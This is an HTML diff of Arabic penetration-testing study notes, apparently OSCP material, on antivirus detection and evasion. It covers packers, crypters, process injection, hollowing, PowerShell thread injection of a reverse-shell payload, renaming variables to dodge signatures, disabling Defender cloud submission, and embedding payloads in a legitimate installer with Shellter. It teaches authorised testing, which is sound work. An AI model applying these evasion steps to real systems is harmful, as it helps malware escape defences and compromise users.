+<!-- ═══════════════════════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">أساليب الكشف عن التهديدات</span></h2>
+
+<div class="step-track">
+
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">Signature-Based Detection — الكشف بالتوقيعات</div>
+<div class="step-body">
+<p>بيشتغل زي نظام Deny-list: بيفحص مواقع التخزين بحثًا عن بصمات رقمية مرتبطة بـ malware مُحدَّد مسبقًا. التوقيع ممكن يكون: hash تشفيري للملف، أنماط bytes مميّزة، أو strings نصية فريدة.</p>
+<p><strong>نقطة الضعف الكبيرة:</strong> حتى تغيير بايت واحد في الملف بيولّد hash تماماً مختلف — يعني نسخة معدَّلة بسيطة من الـ malware ممكن تهرب من الكشف بالـ Hash وحده. عشان كده الحلول الحديثة نادرًا ما بتعتمد عليه لوحده.</p>
+</div>
+</div>
+
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">Heuristic Analysis — التحليل الاستدلالي</div>
+<div class="step-body">
+<p>بيحاول يكتشف التهديدات بفحص بنية الكود ومنطقه بدل البحث عن تطابق حرفي. بيستخدم قواعد وخوارزميات والتعرّف على الأنماط لتحديد إذا كان البرنامج يتصرّف زي الـ Malware.</p>
+<p>تقنياته: تحليل تسلسلات التعليمات بحثًا عن عمليات مشبوهة، إعادة بناء منطق البرنامج عبر Disassembly، وتحديد الدوال الشائعة في النشاط الخبيث. <strong>الميزة:</strong> قادر يكشف variants جديدة من تهديدات معروفة حتى لو مفيش signature مطابق ليها.</p>
+</div>
+</div>
+
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">Behavior Monitoring — المراقبة السلوكية</div>
+<div class="step-body">
+<p>بيركّز على إيه اللي البرنامج بيعمله مش على شكله. الملفات المشبوهة بتتنفَّذ في بيئة معزولة (Sandbox) وبيتراقَب سلوكها بأمان. بيدور على: تعديلات غير مصرَّح بيها للنظام، محاولات تصعيد الامتيازات، اتصالات شبكة غير متوقَّعة، والتدخّل في أدوات الأمان.</p>
+<p><strong>فعّال جداً</strong> ضد التهديدات المخفاة بالتشفير أو الـ Obfuscation — لأن حتى لو الكود كان مشفَّر على القرص، سلوكه في الـ Sandbox بيكشف نواياه.</p>
+</div>
+</div>
+
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">Machine Learning–Driven Detection — الكشف بالذكاء الاصطناعي</div>
+<div class="step-body">
+<p>بيحلّل كميات ضخمة من الـ Metadata — سمات الملف، أنماط السلوك، والخصائص البنيوية — لتحديد احتمالية أن البرنامج خبيث. Microsoft Defender مثلاً بيستخدم نموذج محلي للقرارات السريعة وذكاء سحابي للتحليل العميق عند الحالات الغامضة.</p>
+<p>لأن الـ ML مش بيعتمد على توقيعات محدَّدة، هو فعّال بشكل خاص في اكتشاف التهديدات غير المرئية مسبقًا وعائلات الـ Malware المعدَّلة.</p>
+</div>
+</div>
+
+</div>
+
+<div class="callout examtip">
+<div class="callout-label">★ Exam Tip</div>
+<p>مفيش أسلوب كشف واحد كافي لوحده — كل الحلول الحديثة بتدمج الأساليب الأربعة مع بعض. وده بيفسّر ليه نتائج الكشف بتتفاوت بين منتجات الأمان المختلفة على نفس العيّنة.</p>
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">نظرة عامة على تقنيات التحايل</span></h2>
+<h3>أهداف الوحدة</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>شرح تقنيات تجنّب الكشف لما الكود الخبيث بيكون مخزَّن على القرص</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>وصف الأساليب اللي بتقلّل الكشف بالتشغيل الأساسي في ذاكرة النظام</span></div>
+</div>
+<p>تقنيات التحايل في سياق اختبار الاختراق بتنقسم لفئتين رئيسيتين:</p>
+
+<div class="table-wrap"><table>
+<thead><tr><th>المعيار</th><th>On-Disk Evasion</th><th>In-Memory Evasion</th></tr></thead>
+<tbody>
+<tr><td>الهدف</td><td>تغيير مظهر الملف على القرص</td><td>تجنّب الكتابة على القرص تماماً</td></tr>
+<tr><td>الأثر الجنائي</td><td>ملف معدَّل موجود على القرص</td><td>الكود بيختفي بعد الـ Reboot (الذاكرة RAM فقط)</td></tr>
+<tr><td>المحركات المستهدَفة</td><td>File scanning engines</td><td>File-based detection layers</td></tr>
+<tr><td>الاستمرارية</td><td>ممكن يفضل موجود</td><td>مؤقت (Volatile)</td></tr>
+<tr><td>صعوبة التطبيق</td><td>أسهل نسبياً</td><td>أصعب تقنياً</td></tr>
+<tr><td>احتمال الكشف</td><td>أعلى (مع تطوّر الـ AV)</td><td>أقل (خصوصاً ضد File scanners)</td></tr>
+</tbody>
+</table></div>
+
+<div class="callout note">
+<div class="callout-label">📌 لماذا الفئتين مهمتين معاً</div>
+<p>الـ AV الحديث بيستخدم طبقات دفاعية متعددة — يعني المهاجمين بيكيّفوا أساليبهم باستمرار. الـ Disk-based بيحاول يتهرّب من التحليل الساكن (Static Analysis)، والـ Memory-based بيهدف لتجاوز المراقبة اللي بتحصل قبل التنفيذ.</p>
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU6 -->
+<h2 id="lu6"><span class="num">06</span><span class="htext">تقنيات التحايل على القرص (On-Disk)</span></h2>
+<p>كل الاستراتيجيات دي هدفها منع محركات الفحص من التعرّف على البرامج الخبيثة المخزَّنة على القرص.</p>
+
+<h3>Executable Packers — ضاغطات الملفات التنفيذية</h3>
+<p>من أقدم أساليب التحايل. في بداية الإنترنت، كانت هذه الأدوات بتُستخدم أساساً لتقليل حجم البرامج. لكن الأهم: الـ Packers بتنتج ملفاً تنفيذياً جديداً بـ Binary Layout مختلف تماماً — يعني بصمة رقمية (Hash) مختلفة بالكامل.</p>
+<div class="callout case">
+<div class="callout-label">⚙ كيف تختلف عن الأرشفة العادية</div>
+<p>بخلاف ضغط الـ ZIP العادي، الـ Packer بينتج ملف قابل للتنفيذ مباشرة بـ Binary Layout مختلف كلياً — مع الحفاظ على وظيفته الأصلية. النتيجة: الـ AV القديم اللي يعتمد على التوقيعات ممكن ميعرفوش.</p>
+<p><strong>ملاحظة:</strong> الـ Packers المعروفة (زي UPX) بقت سهلة الكشف بالحلول الحديثة — دلوقتي محتاج Packers مخصَّصة أو نُدرة ليكون فعّالاً.</p>
+</div>
+
+<h3>Code Obfuscation — تعتيم الكود</h3>
+<p>بدل ما تضغط الملف، الـ Obfuscators بتحوّل الكود مع الحفاظ على سلوكه. الأساليب الشائعة:</p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>استبدال التعليمات بمعادلات وظيفية مكافئة</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>إضافة عمليات وهمية غير مؤثرة في النتيجة</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>إعادة ترتيب المنطق البرمجي وترتيب الدوال</span></div>
+  <div class="goal-card"><span class="gi">4</span><span>تقسيم الكود لأجزاء أصغر متفرّقة</span></div>
+</div>
+<p>أدوات الـ Obfuscation المتقدّمة ممكن حتى تعدّل الكود ديناميكياً أثناء التنفيذ — وده بيعقّد التحليل أكثر.</p>
+
+<h3>Encryption-Based Protection — الحماية بالتشفير (Crypters)</h3>
+<p>الـ Crypters بتحوّل المحتوى التنفيذي لصيغة مشفَّرة مع إرفاق Stub صغير بيفكّ التشفير وقت التشغيل. النتيجة:</p>
+<ul>
+  <li>الملف على القرص مشفَّر بالكامل (لا يمكن الكشف عنه بالتوقيعات)</li>
+  <li>فكّ التشفير بيحصل في الذاكرة RAM فقط أثناء التنفيذ</li>
+  <li>المحركات القائمة على الملفات ممكن ما تكتشفوش قبل التشغيل</li>
+</ul>
+
+<h3>Combined Protection — الحماية المركَّبة</h3>
+<p>الاستراتيجيات المتطوّرة نادرًا بتعتمد على أسلوب واحد. بتجمع طبقات متعددة مع إجراءات دفاعية إضافية:</p>
+<div class="callout warning">
+<div class="callout-label">⚠ Anti-Analysis Techniques</div>
+<p>الحماية المركَّبة بتضم: <strong>Anti-Debugging</strong> (منع التحليل بالـ Debugger) + <strong>Anti-Sandbox</strong> (اكتشاف بيئة الـ Sandbox والامتناع عن التنفيذ) + <strong>Anti-Reverse Engineering</strong> (منع فكّ الهندسة العكسية). كتير من هذه التقنيات اتطوَّرت أصلًا لحماية البرامج التجارية من القرصنة.</p>
+</div>
+
+<div class="callout examtip">
+<div class="callout-label">★ ملاحظة OSCP</div>
+<p>رغم أن مفاهيم الـ On-Disk Evasion تبدو بسيطة، تطبيقها بفاعلية صعب تقنياً — وفيه أدوات مجانية قليلة جداً بتقدر تتجاوز الحلول الحديثة بشكل متسق. بعض الأدوات التجارية زي The Enigma Protector بتوضّح قدرات التحايل المتقدّمة اللي بتتحدّى أنظمة الكشف التقليدية.</p>
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU7 -->
+<h2 id="lu7"><span class="num">07</span><span class="htext">تقنيات التحايل في الذاكرة (In-Memory)</span></h2>
+<p>الـ In-Memory Evasion بتركّز على التلاعب بالذاكرة المتطايرة (RAM) بدل تعديل ملفات على القرص. الميزة الرئيسية: أثر جنائي (Forensic Footprint) ضئيل جداً أو معدوم.</p>
+
+<h3>Remote Process Memory Injection</h3>
+<p>إدخال كود خبيث في مساحة عنوان عملية شرعية جارية — بدل إطلاق عملية مشبوهة، المهاجم بيستخدم عملية موثوقة.</p>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">الحصول على Permission للتفاعل مع العملية المستهدَفة</div>
+<div class="step-body"><p>فتح Handle للعملية المستهدَفة بالأذونات المطلوبة (PROCESS_ALL_ACCESS أو أذونات محددة).</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">حجز ذاكرة داخل العملية</div>
+<div class="step-body"><p>استخدام <code>VirtualAllocEx()</code> لحجز مساحة ذاكرة قابلة للتنفيذ داخل Address Space العملية المستهدَفة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">كتابة الـ Payload في المساحة المحجوزة</div>
+<div class="step-body"><p>استخدام <code>WriteProcessMemory()</code> لنسخ الـ Shellcode في المساحة المحجوزة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">تشغيل الكود داخل العملية المضيفة</div>
+<div class="step-body"><p>استخدام <code>CreateRemoteThread()</code> لإنشاء Thread جديد داخل العملية المستهدَفة يبدأ تنفيذه من عنوان الـ Shellcode. الكود بيشتغل تحت هوية العملية الشرعية — وده بيجعل الـ Monitoring Systems تتعامل معه كنشاط طبيعي.</p></div>
+</div>
+</div>
+
+<h3>Reflective Library Injection</h3>
+<p>تحميل مكتبة DLL مباشرة من الذاكرة بدل من القرص. بشكل طبيعي، أنظمة التشغيل بتتوقّع تحميل المكتبات من ملفات — لكن هذه التقنية بتعيد بناء عملية التحميل داخلياً عشان المكتبة تشتغل من غير ما تتكتب على التخزين.</p>
+<div class="callout note">
+<div class="callout-label">📌 التحدّي التقني</div>
+<p>هذه التقنية صعبة تقنياً لأنها بتطلب إعادة بناء الوظائف اللي بيتولّاها System Loader بشكل طبيعي — زي حلّ التبعيات (Resolving Dependencies) وتهيئة التنفيذ.</p>
+</div>
+
+<h3>Process Hollowing</h3>
+<p>بيبدأ بتشغيل عملية شرعية في حالة Suspended (معلَّقة قبل التنفيذ) → استبدال الـ Memory Image الأصلي بكود خبيث → استئناف التنفيذ. العملية بتبدو شرعية من الخارج، لكن سلوكها بيكون تحت سيطرة الـ Payload المُدخَل.</p>
+
+<h3>Inline Hooking</h3>
+<p>بيعدّل ذاكرة عملية جارية لإعادة توجيه تدفّق التنفيذ. تعليمة صغيرة بتتدرج في دالة معيّنة بحيث لما الدالة بتشتغل، التحكّم بينتقل مؤقتًا للكود الخبيث، وبعدين بيرجع للتنفيذ الطبيعي. الأسلوب ده مرتبط بشكل أساسي بعائلات الـ Rootkits.</p>
+
+<h3>Rootkits — الاستمرارية الخفية</h3>
+<div class="callout danger">
+<div class="callout-label">⚡ Advanced Threat</div>
+<p>الـ Rootkits فئة متطوّرة من التهديدات المصمَّمة للبقاء غير مكتشَفة مع الحفاظ على وصول طويل الأمد. ممكن تعدّل مكوّنات على مستويات مختلفة: User Applications، Kernel Modules، أو حتى Boot Mechanisms. التطبيق بيتطلّب صلاحيات مرتفعة (Admin/Root) غالبًا بتُكتسب عبر استغلال ثغرات.</p>
+</div>
+
+<h3>مقارنة أساليب الـ In-Memory Injection</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الآلية</th><th>الصعوبة التقنية</th><th>مستوى الخفاء</th></tr></thead>
+<tbody>
+<tr><td>Remote Process Injection</td><td>كتابة Shellcode في عملية خارجية</td><td>متوسطة</td><td>عالي</td></tr>
+<tr><td>Reflective DLL Injection</td><td>تحميل DLL من الذاكرة مباشرة</td><td>عالية</td><td>عالي جداً</td></tr>
+<tr><td>Process Hollowing</td><td>استبدال Image عملية شرعية</td><td>عالية</td><td>عالي جداً</td></tr>
+<tr><td>Inline Hooking</td><td>تعديل Execution Flow في الذاكرة</td><td>متقدمة جداً</td><td>أعلى (Rootkit-level)</td></tr>
+<tr><td>Thread Injection (Current Process)</td><td>الـ Shellcode في نفس العملية</td><td>منخفضة - متوسطة</td><td>متوسط - عالي</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU8 -->
+<h2 id="lu8"><span class="num">08</span><span class="htext">اختبار فاعلية التحايل وبيئة الاختبار</span></h2>
+
+<h3>مفهوم SecOps</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ SecOps</div>
+<p><strong>SecOps</strong>: التعاون الوثيق بين فريق عمليات الـ IT وفريق SOC (Security Operations Center) بهدف الحفاظ على قدرات مستمرة للمراقبة والوقاية والاستجابة ضد التهديدات المستجدة والمستقرة على حدٍّ سواء.</p>
+</div>
+<p>من منظور مختبر الاختراق: فهم كيف فِرَق SecOps بتنشر وبتدير تقنيات الحماية ضروري لتقييم إذا كانت الضوابط الدفاعية قادرة على كشف أساليب الهجوم المتطوّرة.</p>
+
+<h3>VirusTotal — تحذير مهم</h3>
+<div class="callout danger">
+<div class="callout-label">⚡ لا ترفع أدوات الـ Engagement على VirusTotal</div>
+<p>رفع عيّنة اختبار على VirusTotal بيكشف كم محرك قادر يكتشفها — لكن المنصة بتشارك الملفات المرفوعة مع المورّدين المشاركين. النتيجة: بيتولَّد signatures جديدة بسرعة كبيرة، وأداة الاختبار بتفقد فاعليتها في المهمات المستقبلية.</p>
+</div>
+
+<h3>البدائل الأكثر أماناً للاختبار</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span><strong>AntiScan.Me:</strong> خدمة خاصة بتدّعي فحص العيّنات دون مشاركتها مع المورّدين — استخدمها بحذر ولما بس يكون ضرورياً</span></div>
+  <div class="goal-card"><span class="gi">2</span><span><strong>Lab VM:</strong> الأفضل — إعادة بناء بيئة العميل في VM معزول بنفس الـ AV والإعدادات، يسمح بتجريب حر بدون خطر</span></div>
+</div>
+
+<h3>تعطيل الإرسال التلقائي في Windows Defender</h3>
+<p>كتير من برامج الأمان بيضم ميزات تحليل سحابي بترفع الملفات المشبوهة تلقائياً. أثناء الاختبار، ده ممكن يكشف أدوات مخصَّصة. في Windows Defender:</p>
+<div class="code-wrap"><span class="code-tag">path</span><pre><code>Windows Security
+  → Virus & threat protection
+    → Manage settings
+      → Cloud-delivered protection: OFF
+      → Automatic sample submission: OFF
+</code></pre></div>
+<div class="callout warning">
+<div class="callout-label">⚠ مهم</div>
+<p>عطّل هذه الخيارات في بيئة الاختبار فقط — وبعد خلوص الاختبار، لو بيئة الهدف الحقيقية بتستخدم هذه الميزات، فعّلها تاني عشان تقيّم الكشف في ظروف واقعية.</p>
+</div>
+
+<h3>أهمية الـ Custom Tooling</h3>
+<p>قواعد الكشف بتُشتَقّ غالبًا من عيّنات مُحلَّلة مسبقًا. الكود المخصَّص والتقنيات الفريدة بتكون أقل احتمالاً لمطابقة التوقيعات الموجودة مقارنةً بالأدوات الشائعة المعروفة.</p>
+<div class="callout tip">
+<div class="callout-label">✓ Best Practice</div>
+<p>في التقييمات الأمنية المرخَّصة، تطوير أدوات اختبار مخصَّصة بيساعد في قياس مدى استجابة الدفاعات للتهديدات المبتكرة — وده أدقّ وأنفع من استخدام أدوات معروفة بتوقيعاتها مسبقة في قواعد بيانات الـ AV.</p>
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU9 -->
+<h2 id="lu9"><span class="num">09</span><span class="htext">Thread Injection — تطبيق عملي بـ PowerShell</span></h2>
+
+<h3>ليه بنستهدف AV محدد؟</h3>
+<p>إنشاء تحايل شامل لكل منتجات الأمان صعب جداً — كل مورّد بيستخدم توقيعات وهيوريستيك وتحليل سلوكي ونماذج ML مختلفة. في الـ Engagement، المختبر بيركّز على الـ AV المحدد المنتشر في بيئة الهدف.</p>
+
+<h3>إعداد بيئة الاختبار</h3>
+<div class="callout case">
+<div class="callout-label">⚙ Lab Setup — المثال العملي</div>
+<p><strong>AV:</strong> Avira Free Security على Windows 11<br/>
+<strong>التحقق المطلوب قبل الاختبار:</strong> الحماية اللحظية مفعَّلة ✓ | التوقيعات محدَّثة ✓ | الـ AV بيكتشف Payloads معروفة ✓</p>
+</div>
+
+<h3>الخطوة الأولى — التحقق من عمل الـ AV</h3>
+<p>خطوة التحقق المعيارية: رفع Payload معروف (مثلًا مولَّد بـ Metasploit) — لو الـ AV عزله فوراً، ده بيأكّد: محرك الملفات شغّال، الحماية على مستوى Kernel مفعَّلة، وآليات العزل (Quarantine) تعمل صح.</p>
+
+<h3>ليه الـ In-Memory Injection بيشتغل؟</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>مفيش ملف خبيث بيتكتب على القرص — File Scanners ما عندهاش إيه تفحصه</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>كشف التوقيعات صعب جداً — الـ Shellcode مش موجود كملف</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>الأثر الجنائي ضئيل — الكود بيختفي مع Reboot الجهاز</span></div>
+</div>
+
+<h3>Thread Injection — إيه هو بالظبط؟</h3>
+<p>في المثال ده، بنعمل Injection في نفس العملية الجارية (PowerShell) — مش في عملية خارجية.</p>
+
+<h3>ليه PowerShell الاختيار الأمثل؟</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>يقدر يستدعي Windows APIs مباشرة بدون ملفات إضافية</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>Scripts = نص عادي (سهل التعديل والتخصيص)</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>مش محتاج Compilation — بيشتغل جوّا Interpreter</span></div>
+  <div class="goal-card"><span class="gi">4</span><span>متاح افتراضياً على كل أنظمة Windows الحديثة</span></div>
+</div>
+
+<h3>Windows APIs المستخدَمة في Thread Injection</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>API Call</th><th>الوظيفة</th><th>المرحلة</th></tr></thead>
+<tbody>
+<tr><td><code>VirtualAlloc()</code></td><td>حجز ذاكرة قابلة للتنفيذ (PAGE_EXECUTE_READWRITE) داخل العملية الحالية</td><td>تهيئة الذاكرة</td></tr>
+<tr><td><code>memset()</code></td><td>نسخ bytes الـ Shellcode في المساحة المحجوزة</td><td>كتابة الـ Payload</td></tr>
+<tr><td><code>CreateThread()</code></td><td>إنشاء Thread جديد يبدأ تنفيذه من عنوان الـ Shellcode</td><td>تشغيل الـ Payload</td></tr>
+</tbody>
+</table></div>
+
+<h3>سير العمل العملي (Workflow)</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">A</div>
+<div class="step-title">توليد الـ Shellcode</div>
+<div class="step-body"><p>باستخدام إطار عمل زي Metasploit، نولّد Payload (مثلًا Reverse Shell). الـ Payload بيتخزَّن كـ Byte Array داخل السكربت.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">B</div>
+<div class="step-title">حجز الذاكرة وإدخال الـ Payload</div>
+<div class="step-body">
+<p>السكربت بيحجز ذاكرة قابلة للتنفيذ بـ <code>VirtualAlloc()</code>، بينسخ الـ Shellcode فيها بـ <code>memset()</code>، وبيشغّله عبر <code>CreateThread()</code>.</p>
+<p><strong>النتيجة:</strong> الكود الخبيث بيتنفَّذ من غير ما يلمس القرص.</p>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">C</div>
+<div class="step-title">تلقّي الـ Reverse Connection</div>
+<div class="step-body"><p>Listener (مثلًا Netcat أو Metasploit Handler) بيستنى الاتصال الوارد — المهاجم بيحصل على Shell وبيبدو النشاط كإجراء طبيعي من العملية المضيفة.</p></div>
+</div>
+</div>
+
+<h3>ليه الـ Script الأصلي بيتكشَّف؟</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>سبب الكشف</th><th>التفاصيل</th></tr></thead>
+<tbody>
+<tr><td>Known injection patterns</td><td>الـ AV بيتعرّف على أنماط VirtualAlloc + memset + CreateThread مع بعض</td></tr>
+<tr><td>Suspicious API usage</td><td>استخدام APIs معيّنة مع بعض يطلّع علامة تحذير</td></tr>
+<tr><td>Recognizable variable names</td><td>أسماء المتغيّرات الافتراضية <code>$sc</code>، <code>$winFunc</code> إلخ. موجودة في قواعد كشف ثابتة</td></tr>
+<tr><td>Static string signatures</td><td>نص <code>Win32</code> داخل السكربت بيطابق signatures قائمة</td></tr>
+</tbody>
+</table></div>
+
+<h3>الـ Obfuscation — تقليل الكشف بتعديل بسيط</h3>
+<p>لأن السكربتات نصوص عادية، تعديلات بسيطة ممكن تتحايل على الكشف الساكن (Static Detection):</p>
+<div class="code-wrap"><span class="code-tag">powershell — obfuscation example</span><pre><code># الأسماء الأصلية المكتشَفة:
+$sc      → $var1
+$winFunc → $var2
+Win32    → iWin32
+
+# حتى هذا التغيير البسيط يمكن أن يقلل نسبة التطابق مع Signatures
+</code></pre></div>
+
+<h3>سياسة تنفيذ الـ PowerShell Scripts</h3>
+<p>Windows بيمنع تشغيل السكربتات بشكل افتراضي عبر Execution Policies:</p>
+<div class="table-wrap"><table>
+<thead><tr><th>السياسة</th><th>التأثير</th></tr></thead>
+<tbody>
+<tr><td><code>Restricted</code></td><td>الافتراضي — يمنع تشغيل أي Script بالكامل</td></tr>
+<tr><td><code>RemoteSigned</code></td><td>يسمح للـ Scripts المحلية، يطلب توقيع للـ Scripts البُعدية</td></tr>
+<tr><td><code>Unrestricted</code></td><td>يسمح بكل Scripts مع تحذير للبُعدية</td></tr>
+<tr><td><code>Bypass</code></td><td>لا قيود ولا تحذيرات — الأنسب لبيئات الاختبار</td></tr>
+</tbody>
+</table></div>
+<div class="callout note">
+<div class="callout-label">📌 ملاحظة</div>
+<p>السياسات في الغالب خاصة بالمستخدم ويمكن التحكّم فيها عبر Group Policy. تغيير السياسة بيسمح بتشغيل الـ Script — لكنه بيكون في حدّ ذاته إجراء ممكن أن يلفت الانتباه في بيئات الإنتاج.</p>
+</div>
+
+<h3>رسم تخطيطي: Thread Injection Flow</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 140" xmlns="http://www.w3.org/2000/svg">
+  <!-- Step boxes -->
+  <rect x="8"   y="40" width="110" height="60" rx="6" class="dsvg-box-a"/>
+  <text x="63"  y="62" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">PowerShell</text>
+  <text x="63"  y="78" text-anchor="middle" class="dsvg-muted" font-size="9">Script + Shellcode</text>
+  <text x="63"  y="93" text-anchor="middle" class="dsvg-muted" font-size="9">Byte Array</text>
+
+  <line x1="118" y1="70" x2="148" y2="70" class="dsvg-line"/>
+  <polygon points="148,65 158,70 148,75" class="dsvg-arr"/>
+
+  <rect x="158" y="40" width="120" height="60" rx="6" class="dsvg-box-b"/>
+  <text x="218" y="62" text-anchor="middle" class="dsvg-blue" font-size="10" font-weight="700">VirtualAlloc()</text>
+  <text x="218" y="78" text-anchor="middle" class="dsvg-muted" font-size="9">حجز ذاكرة</text>
+  <text x="218" y="93" text-anchor="middle" class="dsvg-muted" font-size="9">PAGE_EXECUTE_RW</text>
+
+  <line x1="278" y1="70" x2="308" y2="70" class="dsvg-line"/>
+  <polygon points="308,65 318,70 308,75" class="dsvg-arr"/>
+
+  <rect x="318" y="40" width="120" height="60" rx="6" class="dsvg-box-b"/>
+  <text x="378" y="62" text-anchor="middle" class="dsvg-blue" font-size="10" font-weight="700">memset()</text>
+  <text x="378" y="78" text-anchor="middle" class="dsvg-muted" font-size="9">كتابة الـ Shellcode</text>
+  <text x="378" y="93" text-anchor="middle" class="dsvg-muted" font-size="9">في الذاكرة المحجوزة</text>
+
+  <line x1="438" y1="70" x2="468" y2="70" class="dsvg-line"/>
+  <polygon points="468,65 478,70 468,75" class="dsvg-arr"/>
+
+  <rect x="478" y="40" width="120" height="60" rx="6" class="dsvg-box-p"/>
+  <text x="538" y="62" text-anchor="middle" font-size="10" font-weight="700" style="fill:var(--purple)">CreateThread()</text>
+  <text x="538" y="78" text-anchor="middle" class="dsvg-muted" font-size="9">تشغيل Thread</text>
+  <text x="538" y="93" text-anchor="middle" class="dsvg-muted" font-size="9">→ Reverse Shell</text>
+
+  <!-- Labels below -->
+  <text x="63"  y="118" text-anchor="middle" class="dsvg-muted" font-size="9">المرحلة 0</text>
+  <text x="218" y="118" text-anchor="middle" class="dsvg-muted" font-size="9">المرحلة 1</text>
+  <text x="378" y="118" text-anchor="middle" class="dsvg-muted" font-size="9">المرحلة 2</text>
+  <text x="538" y="118" text-anchor="middle" class="dsvg-muted" font-size="9">المرحلة 3</text>
+  <!-- All in RAM label -->
+  <text x="350" y="18" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">⚡ كل العمليات تحدث في RAM فقط — لا شيء يُكتب على القرص</text>
+</svg>
+<div class="diagram-caption">Thread Injection — الـ Payload بيتنفَّذ مباشرة في ذاكرة العملية</div>
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU10 -->
+<h2 id="lu10"><span class="num">10</span><span class="htext">أتمتة التحايل باستخدام Shellter</span></h2>
+
+<h3>إيه هو Shellter؟</h3>
+<p>Shellter هي أداة Dynamic Shellcode Injection مصمَّمة لتضمين Payloads خبيثة داخل ملفات Windows التنفيذية الشرعية (PE) بطريقة خفية — بديل أكثر تطوّراً من تقنيات الـ Injection الكلاسيكية التي يكتشفها الـ AV بسهولة.</p>
+
+<h3>ما اللي Shellter بتعمله بالظبط؟</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تحليل عميق لبنية الـ PE ومسارات التنفيذ</div>
+<div class="step-body"><p>Shellter بتدرس الملف التنفيذي الشرعي بعمق — بنيته الداخلية، كل مسارات التنفيذ الممكنة، وتدفّق الكود.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">إيجاد أماكن آمنة لإدخال الـ Shellcode</div>
+<div class="step-body"><p>بتحدّد مواقع داخل الكود الأصلي تسمح بإدراج الـ Shellcode بدون كسر وظيفة البرنامج.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تجنّب الأفعال المشبوهة</div>
+<div class="step-body"><p>Shellter ما بتغيّرش صلاحيات الـ Sections الموجودة وما بتنشئش Sections جديدة — وده بالضبط اللي كان بيكشف أدوات الـ Injection التقليدية.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">إعادة استخدام إدخالات الـ IAT الموجودة</div>
+<div class="step-body"><p>بدل استدعاء Windows APIs بشكل مباشر ومشبوه، بتستخدم Import Address Table (IAT) الموجودة أصلاً في الملف للـ Memory Allocation والـ Payload Transfer والـ Execution — وده بيخلّي الملف المعدَّل يبدو شرعياً لمحركات الكشف القائمة على التوقيعات.</p></div>
+</div>
+</div>
+
+<div class="callout note">
+<div class="callout-label">📌 Shellter vs Shellter Pro</div>
+<p>النسخة المجانية بتدعم ملفات PE الـ 32-bit فقط. النسخة التجارية (Shellter Pro) بتدعم 32-bit و64-bit مع قدرات Stealth أكثر تقدُّماً.</p>
+</div>
+
+<h3>تثبيت Shellter على Kali Linux</h3>
+<p>رغم أن Shellter بتستهدف ملفات Windows، ممكن تشغّلها على Kali بواسطة <strong>Wine</strong> (طبقة التوافق اللي بتسمح بتشغيل تطبيقات Windows على Linux).</p>
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># البحث عن الحزمة
+apt-cache search shellter
+
+# تثبيت Shellter
+sudo apt install shellter
+
+# تثبيت Wine
+sudo apt install wine
+
+# إضافة معمارية 32-bit
+dpkg --add-architecture i386
+apt-get update
+apt-get install wine32
+</code></pre></div>
+
+<h3>أوضاع التشغيل</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الوضع</th><th>الوصف</th><th>متى تستخدمه؟</th></tr></thead>
+<tbody>
+<tr><td><strong>Auto Mode</strong></td><td>عملية Injection آلية كاملة بأدنى تدخّل من المستخدم</td><td>الاختيار الأول في معظم السيناريوهات</td></tr>
+<tr><td><strong>Manual Mode</strong></td><td>تحكّم دقيق في كل خطوة من عملية الـ Injection</td><td>عندما يفشل Auto Mode أو تحتاج تخصيص متقدم</td></tr>
+</tbody>
+</table></div>
+
+<h3>اختيار الـ PE Target</h3>
+<p>Shellter بتحتاج ملف Windows PE شرعي كـ Carrier للـ Payload.</p>
+<div class="callout case">
+<div class="callout-label">⚙ المثال المستخدَم في الشرح</div>
+<p><strong>Spotify Installer (32-bit)</strong> — لماذا؟ يبدو موثوقاً للمستخدم، أقل ترشيحاً للفحص من قِبَل أدوات الأمان، وغالباً مسموح له في سياسات الأمان.</p>
+</div>
